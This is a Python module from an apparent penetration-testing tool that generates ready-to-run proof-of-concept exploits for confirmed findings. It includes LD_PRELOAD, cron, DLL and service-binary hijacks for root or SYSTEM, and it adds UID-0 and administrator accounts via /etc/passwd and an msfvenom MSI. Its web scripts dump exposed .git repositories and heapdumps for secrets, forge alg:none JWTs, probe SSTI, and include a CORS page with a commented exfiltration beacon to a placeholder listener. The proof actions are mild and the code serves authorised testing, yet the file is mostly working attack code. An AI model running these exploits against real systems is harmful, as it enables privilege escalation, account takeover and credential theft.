"""Benign proof-of-concept build recipes.

"Drop a payload here" isn't actionable without the payload. For a CONFIRMED
finding this emits the EXACT source + build command + delivery for the standard,
documented PoC artifact - deliberately BENIGN: the default action just proves
execution (runs `id`/`whoami` into a marker file, or adds a clearly-named
throwaway account), which is exactly what a write-up needs. Swap the single
ACTION line for your ROE-approved command.

Everything is a published technique built with tools Kali ships (gcc, mingw,
msfvenom). Nothing here is obfuscated or AV-evasive: these are plain proofs. If a
security control blocks a plain PoC, coordinate an exclusion for the test window
(the ROE path) rather than engineering evasion - recce does not do that.
"""

from __future__ import annotations

import os
import re

MARKER = "recce_poc"        # marker file / throwaway account name used by the proofs


# --- payload sources (benign proof actions) -------------------------------------

def _c_ld_preload() -> str:
    return (
        "/* recce PoC - LD_PRELOAD / writable-.so / env-injection escalation.\n"
        " * BENIGN: elevates, then writes proof to /tmp/recce_poc.txt.\n"
        " * Swap the system() line for your ROE-approved action.\n"
        " * build: gcc -fPIC -shared -nostartfiles -o /tmp/recce_poc.so recce_poc_preload.c */\n"
        "#include <stdlib.h>\n"
        "#include <unistd.h>\n"
        "void _init(void) {\n"
        "    setgid(0); setuid(0);\n"
        "    system(\"id > /tmp/recce_poc.txt 2>&1\");\n"
        "}\n")


def _sh_root_job() -> str:
    return (
        "#!/bin/sh\n"
        "# recce PoC - runs when a root job (cron / service / PATH-hijacked command) fires.\n"
        "# BENIGN: proves root execution. Swap for your ROE action.\n"
        "id > /tmp/recce_poc.txt 2>&1\n")


def _c_win_dll() -> str:
    return (
        "/* recce PoC DLL - proves a hijacked DLL loaded in the target process.\n"
        " * BENIGN: writes whoami to C:\\recce_poc.txt. Swap for your ROE action.\n"
        " * A real hijack should PROXY the legit exports so the app keeps working.\n"
        " * build: x86_64-w64-mingw32-gcc recce_poc_dll.c -shared -o evil.dll */\n"
        "#include <windows.h>\n"
        "#include <stdlib.h>\n"
        "BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID reserved) {\n"
        "    if (reason == DLL_PROCESS_ATTACH) {\n"
        "        system(\"cmd /c whoami > C:\\\\recce_poc.txt\");\n"
        "    }\n"
        "    return TRUE;\n"
        "}\n")


def _sh_web() -> str:
    return (
        "#!/bin/sh\n"
        "# recce web PoC - proves a web exposure / dangerous-method finding. BENIGN.\n"
        "# usage: sh recce_poc_web.sh http://TARGET:PORT\n"
        "U=\"${1:?usage: recce_poc_web.sh http://target:port}\"\n"
        "echo \"[*] exposed .git/HEAD:\"; curl -sk \"$U/.git/HEAD\"\n"
        "echo \"[*] exposed .env:\";     curl -sk \"$U/.env\" | head -3\n"
        "echo \"[*] server-status:\";    curl -sk \"$U/server-status\" | head -3\n"
        "echo \"[*] actuator/env:\";     curl -sk \"$U/actuator/env\" | head -3\n"
        "echo \"[*] prometheus:\";       curl -sk \"$U/metrics\" | head -3\n"
        "echo \"[*] .htpasswd:\";        curl -sk \"$U/.htpasswd\"\n"
        "echo \"[*] crossdomain:\";      curl -sk \"$U/crossdomain.xml\"\n"
        "echo \"[*] graphql introspection:\"; curl -sk -X POST -H 'Content-Type: application/json' "
        "-d '{\"query\":\"{__schema{queryType{name}}}\"}' \"$U/graphql\" | head -c 200; echo\n"
        "echo \"[*] CORS reflect:\";     curl -skI -H 'Origin: https://recce.example' \"$U/\" | grep -i '^access-control-'\n"
        "echo \"[*] SSTI (expect 49):\"; curl -sk \"$U/?rc=recceA%7B%7B7*7%7D%7D\" | grep -o 'recceA49'\n"
        "echo \"[*] allowed methods:\";  curl -skI -X OPTIONS \"$U/\" | grep -i '^allow:'\n"
        "# JWT: decode with  jwt_tool <token> ;  forge alg=none with  jwt_tool <token> -X a\n"
        "echo \"[*] PUT test (writes a marker if enabled):\"\n"
        "curl -sk -X PUT \"$U/recce_poc.txt\" -d 'recce_poc'; curl -sk \"$U/recce_poc.txt\"; echo\n"
        "# For a confirmed .git:  git-dumper \"$U/.git\" ./loot\n")


def _c_win_exe() -> str:
    return (
        "/* recce PoC exe - proves execution as the service / intercept account.\n"
        " * BENIGN: writes whoami to C:\\recce_poc.txt. Swap for your ROE action.\n"
        " * For a REAL Windows service use  msfvenom -f exe-service  (it does the SCM\n"
        " * handshake so SCM doesn't kill it); this plain exe suits unquoted-path,\n"
        " * writable-binary and autorun intercepts that just launch a process.\n"
        " * build: x86_64-w64-mingw32-gcc recce_poc_exe.c -o payload.exe */\n"
        "#include <stdlib.h>\n"
        "int main(void) {\n"
        "    system(\"cmd /c whoami > C:\\\\recce_poc.txt\");\n"
        "    return 0;\n"
        "}\n")


# --- recipe registry ------------------------------------------------------------
# files : {filename: source}   build : [shell build commands]
# deliver: how to place/trigger it   proof: how to confirm it fired

RECIPES: dict[str, dict] = {
    "ld_preload": {
        "name": "LD_PRELOAD / writable-.so / SUID env-injection -> root",
        "files": {"recce_poc_preload.c": _c_ld_preload()},
        "build": ["gcc -fPIC -shared -nostartfiles -o /tmp/recce_poc.so recce_poc_preload.c"],
        "deliver": "sudo LD_PRELOAD=/tmp/recce_poc.so <allowed-sudo-cmd>   "
                   "(or: echo /tmp/recce_poc.so >> /etc/ld.so.preload  then invoke any SUID, e.g. ping)",
        "proof": "cat /tmp/recce_poc.txt   -> uid=0(root)",
    },
    "linux_root_job": {
        "name": "Writable cron / service / PATH-hijack -> root",
        "files": {"recce_poc_root.sh": _sh_root_job()},
        "build": ["chmod +x recce_poc_root.sh"],
        "deliver": "point the writable job at recce_poc_root.sh (or name it as the hijacked command in the "
                   "writable PATH dir); wait for the root job/cron to run it.",
        "proof": "cat /tmp/recce_poc.txt   -> uid=0(root)",
    },
    "linux_passwd": {
        "name": "Writable /etc/passwd -> add a UID-0 account",
        "files": {},
        "build": ["openssl passwd -6 'Recce!Poc123'      # copy the hash into the line below"],
        "deliver": "echo 'recce_poc:<hash-from-above>:0:0::/root:/bin/bash' >> /etc/passwd",
        "proof": "su recce_poc  (password Recce!Poc123)  -> id shows uid=0.  REMOVE the line afterwards.",
    },
    "win_service_exe": {
        "name": "Unquoted path / writable service binary / autorun -> SYSTEM",
        "files": {"recce_poc_exe.c": _c_win_exe()},
        "build": [
            'msfvenom -p windows/x64/exec CMD="cmd /c whoami > C:\\recce_poc.txt" -f exe-service -o payload.exe'
            "   # real services (does the SCM handshake)",
            "x86_64-w64-mingw32-gcc recce_poc_exe.c -o payload.exe"
            "   # plain exe for unquoted-path / autorun / writable-binary intercepts",
        ],
        "deliver": "copy payload.exe to the exact plant/overwrite path recce named; "
                   "sc stop <svc> & sc start <svc>  (or wait for the trigger).",
        "proof": "type C:\\recce_poc.txt   -> nt authority\\system",
    },
    "win_dll": {
        "name": "DLL hijack -> code exec in the target (often SYSTEM) process",
        "files": {"recce_poc_dll.c": _c_win_dll()},
        "build": [
            'msfvenom -p windows/x64/exec CMD="cmd /c whoami > C:\\recce_poc.txt" -f dll -o evil.dll',
            "x86_64-w64-mingw32-gcc recce_poc_dll.c -shared -o evil.dll"
            "   # proxy the real exports so the host app keeps working",
        ],
        "deliver": "rename evil.dll to the missing/hijacked DLL recce identified; place it in the writable "
                   "dir; start/restart the target exe/service.",
        "proof": "type C:\\recce_poc.txt   -> the target process's context",
    },
    "web": {
        "name": "Web exposure / dangerous method -> proof requests",
        "files": {"recce_poc_web.sh": _sh_web()},
        "build": ["chmod +x recce_poc_web.sh"],
        "deliver": "sh recce_poc_web.sh http://<target>:<port>",
        "proof": "the fetched .git/.env/actuator content, or the PUT marker echoed back.",
    },
    "win_msi": {
        "name": "AlwaysInstallElevated -> SYSTEM via MSI",
        "files": {},
        "build": ['msfvenom -p windows/x64/exec CMD="net localgroup administrators recce_poc /add" '
                  "-f msi -o recce_poc.msi"],
        "deliver": "msiexec /quiet /qn /i recce_poc.msi",
        "proof": "net localgroup administrators  -> lists recce_poc.  REMOVE it afterwards "
                 "(net localgroup administrators recce_poc /del).",
    },
}


_MATCH = [
    (r"ld_preload|ld\.so\.preload|env-injection|env_keep.*ld_|writable (shared-)?librar|\.so hijack",
     "ld_preload"),
    (r"/etc/passwd is writable|writable /etc/passwd", "linux_passwd"),
    (r"path-hijack|path hijack|writable cron|writable .*timer|writable service unit|runs a writable binary|"
     r"writable root|writable library dir", "linux_root_job"),
    (r"alwaysinstallelevated", "win_msi"),
    (r"exposed (git|\.git|\.env|svn|\.ds_store|aws)|\.env file|mod_status exposed|"
     r"mod_info exposed|actuator|phpinfo|directory listing enabled|dangerous http methods|"
     r"web\.config readable|crossdomain|prometheus /metrics|\.htpasswd|graphql introspection|"
     r"cors reflects|server-side template injection|jwt (accepts|uses)|secret in client-side js|"
     r"backup/source file", "web"),
    (r"unquoted service|writable service binary|writable autorun|writable scheduled-task|"
     r"writable service registry", "win_service_exe"),
    (r"dll hijack|writable directory in (system|user) path|writable app dir|com inprocserver|com hijack|"
     r"service binary directory is writable", "win_dll"),
]
_MATCH_C = [(re.compile(p, re.I), k) for p, k in _MATCH]


# --- per-finding web PoCs -------------------------------------------------------
# A tailored, runnable, BENIGN proof for each web finding type, with the target
# URL filled in. RCE escalations reference the published PoC (run in ROE).

_TLS_PORTS = {443, 8443, 9443, 4443, 10443, 5986}


def _url_from_vuln(v) -> str:
    m = re.search(r"https?://[^\s/]+", getattr(v, "output", "") or "")
    if m:
        return m.group(0)
    port = getattr(v, "port", None)
    if not port:
        return f"http://{v.ip}"
    sch = "https" if port in _TLS_PORTS else "http"
    hostport = v.ip if port in (80, 443) else f"{v.ip}:{port}"
    return f"{sch}://{hostport}"


def _p_git(u):
    return ("sh", "#!/bin/sh\n# recce .git PoC - dump the exposed repo, surface its secrets. BENIGN (read-only).\n"
            "# needs: pipx install git-dumper\n"
            f"git-dumper \"{u}/.git\" ./recce_git_loot && \\\n"
            "  grep -rinE 'password|secret|api[_-]?key|token|BEGIN .*PRIVATE KEY' ./recce_git_loot | head\n",
            "dump the source + secrets from the exposed .git")


def _p_cors(u):
    js = (
        "<!-- recce CORS PoC - proves the target reflects our Origin + credentials.\n"
        "     Host this on a server you control; open it in a browser logged into the target. -->\n"
        "<pre id=o>running...</pre>\n<script>\n"
        "fetch(%r, {credentials:'include'}).then(r=>r.text()).then(t=>{\n"
        "  o.textContent = 'Read '+t.length+\" bytes of the victim's AUTHENTICATED response:\\n\\n\"+t.slice(0,500);\n"
        "  // exfil to your listener: navigator.sendBeacon('http://YOUR-LISTENER/', t);\n"
        "}).catch(e=>o.textContent='blocked: '+e);\n</script>\n" % u)
    return ("html", js,
            "open in a logged-in browser: reads the victim's cross-origin authenticated response")


def _p_jwt(u):
    body = [
        "#!/usr/bin/env python3",
        "# recce JWT alg:none PoC - forge an unsigned token with a tampered claim. BENIGN.",
        "import base64, json, sys",
        "URL = " + repr(u),
        "tok = sys.argv[1] if len(sys.argv) > 1 else 'PASTE_JWT_HERE'",
        "def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()",
        "h, p, _ = tok.split('.')",
        "claims = json.loads(base64.urlsafe_b64decode(p + '=' * (-len(p) % 4)))",
        "claims['admin'] = True            # tamper a claim as the proof",
        'forged = b64u(b\'{"alg":"none","typ":"JWT"}\') + \'.\' + b64u(json.dumps(claims).encode()) + \'.\'',
        "print('forged token:', forged)",
        'print(\'replay: curl -H "Authorization: Bearer \' + forged + \'" \' + URL)',
    ]
    return ("py", "\n".join(body) + "\n",
            "forge an alg:none token with a tampered claim, then replay it")


def _p_ssti(u):
    return ("sh", "#!/bin/sh\n# recce SSTI PoC - confirm + identify the template engine (benign math). \n"
            f'U="{u}"\n'
            "enc(){ python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' \"$1\"; }\n"
            "for p in 'rc{{7*7}}' 'rc${7*7}' 'rc#{7*7}' 'rc<%=7*7%>' 'rc{{7*\"7\"}}'; do\n"
            "  printf '%-14s -> ' \"$p\"; curl -sk \"$U?rc=$(enc \"$p\")\" | grep -oE 'rc[0-9]+' | head -1\n"
            "done\n"
            "# rc49 -> arithmetic engine (Jinja2/Twig/Freemarker); rc7777777 -> Jinja2/Twig string.\n"
            "# escalate to RCE with:  tplmap -u \"$U?rc=*\"   (within ROE)\n",
            "identify the template engine; escalate with tplmap in ROE")


def _p_graphql(u):
    return ("sh", "#!/bin/sh\n# recce GraphQL PoC - dump the schema via introspection. BENIGN.\n"
            f'U="{u}"\n'
            "curl -sk -X POST -H 'Content-Type: application/json' \\\n"
            "  -d '{\"query\":\"query{__schema{types{name fields{name}}}}\"}' \"$U/graphql\" \\\n"
            "  | python3 -m json.tool | head -80\n",
            "dump the full GraphQL schema (types + fields)")


def _p_heapdump(u):
    return ("sh", "#!/bin/sh\n# recce Actuator heapdump PoC - download + grep memory for secrets. BENIGN.\n"
            f"curl -sk \"{u}/actuator/heapdump\" -o recce_heap.hprof && \\\n"
            "  strings recce_heap.hprof | grep -iE 'password|secret|token|jdbc:|api[_-]?key' | sort -u | head -40\n",
            "download the heapdump and surface in-memory secrets")


def _p_methods(u):
    return ("sh", "#!/bin/sh\n# recce HTTP PUT PoC - prove a write primitive (benign marker). Remove it after.\n"
            f'U="{u}"\n'
            "curl -sk -X PUT \"$U/recce_poc.txt\" -d 'recce_poc' -o /dev/null -w '%{http_code}\\n'\n"
            "curl -sk \"$U/recce_poc.txt\"; echo\n"
            "curl -sk -X DELETE \"$U/recce_poc.txt\" -o /dev/null   # cleanup\n",
            "PUT a marker file and read it back (then DELETE it)")


def _p_download(u):
    return ("sh", "#!/bin/sh\n# recce exposed-file PoC - fetch the secret-bearing file. BENIGN (read-only).\n"
            f'U="{u}"\n'
            'echo "$U"; curl -sk "$U" | head -40\n',
            "fetch the exposed file and show its (secret) contents")


def _p_js_secret(u):
    return ("sh", "#!/bin/sh\n# recce JS-secret PoC - pull the key out of the client-side script. BENIGN.\n"
            f"curl -sk \"{u}\" | grep -oE 'AIza[0-9A-Za-z_-]{{35}}|AKIA[0-9A-Z]{{16}}|sk_live_[0-9A-Za-z]+|"
            "gh[pousr]_[0-9A-Za-z]{36}|-----BEGIN [A-Z ]*PRIVATE KEY-----' | sort -u\n",
            "extract the hardcoded key from the JS file")


_WEB_POC = {
    "web-git": _p_git, "web-gitconfig": _p_git,
    "web-cors": _p_cors, "web-jwt": _p_jwt, "web-ssti": _p_ssti,
    "web-graphql": _p_graphql, "web-actuator-heapdump": _p_heapdump,
    "web-methods": _p_methods, "web-js-secret": _p_js_secret,
    "web-dotenv": _p_download, "web-aws": _p_download, "web-htpasswd": _p_download,
    "web-backup": _p_download, "web-actuator-env": _p_download,
    "web-actuator-configprops": _p_download, "web-metrics": _p_download,
    "web-serverstatus": _p_download, "web-serverinfo": _p_download,
    "web-phpinfo": _p_download,
}


def web_pocs_for_host(host) -> list[tuple]:
    """Per-web-finding PoC artifacts for a host: [(filename, content, note)],
    deduped by (script_id, port). Tailored to each finding, URL filled in."""
    out: list[tuple] = []
    seen: set[tuple] = set()
    for v in getattr(host, "vulns", []) or []:
        if getattr(v, "source", "") != "web":
            continue
        builder = _WEB_POC.get(v.script_id)
        if not builder:
            continue
        key = (v.script_id, v.port)
        if key in seen:
            continue
        seen.add(key)
        ext, content, note = builder(_url_from_vuln(v))
        fname = f"poc_{v.script_id}_{host.ip}_{v.port or 0}.{ext}"
        out.append((fname, content, note))
    return out


def recipe_key_for(text: str) -> str | None:
    for rx, k in _MATCH_C:
        if rx.search(text or ""):
            return k
    return None


def select_for_host(host) -> dict[str, dict]:
    """The applicable PoC recipes for a host's CONFIRMED findings, keyed by id."""
    keys: list[str] = []
    texts: list[str] = []
    for v in getattr(host, "vulns", []) or []:
        if getattr(v, "confidence", "") != "potential":
            texts.append(f"{v.title} {v.output}")
    for f in getattr(host, "local_findings", []) or []:
        texts.append(f.get("vector", ""))
    for t in texts:
        k = recipe_key_for(t)
        if k and k not in keys:
            keys.append(k)
    return {k: RECIPES[k] for k in keys}


def write_files(poc_dir: str, recipes: dict, written: set | None = None) -> list[str]:
    """Write each recipe's source files into poc_dir (deduped via `written`).
    Returns the list of file paths written this call."""
    os.makedirs(poc_dir, exist_ok=True)
    written = written if written is not None else set()
    out: list[str] = []
    for r in recipes.values():
        for fname, content in r.get("files", {}).items():
            if fname in written:
                continue
            written.add(fname)
            path = os.path.join(poc_dir, fname)
            with open(path, "w") as fh:
                fh.write(content)
            out.append(path)
    return out


def plan_lines(recipes: dict) -> list[str]:
    """Commented reference block (build -> deliver -> proof) for a host script."""
    if not recipes:
        return []
    lines = [
        "# ======================================================",
        "# PoC BUILD RECIPES (benign proofs - swap the ACTION for your ROE command)",
        "# Source files are in ./poc/ ; nothing here is obfuscated or AV-evasive.",
        "# ======================================================",
    ]
    for r in recipes.values():
        lines.append(f"#   {r['name']}")
        for f in r.get("files", {}):
            lines.append(f"#     source : poc/{f}")
        for b in r["build"]:
            lines.append(f"#     build  : {b}")
        lines.append(f"#     deliver: {r['deliver']}")
        lines.append(f"#     proof  : {r['proof']}")
        lines.append("#")
    return lines
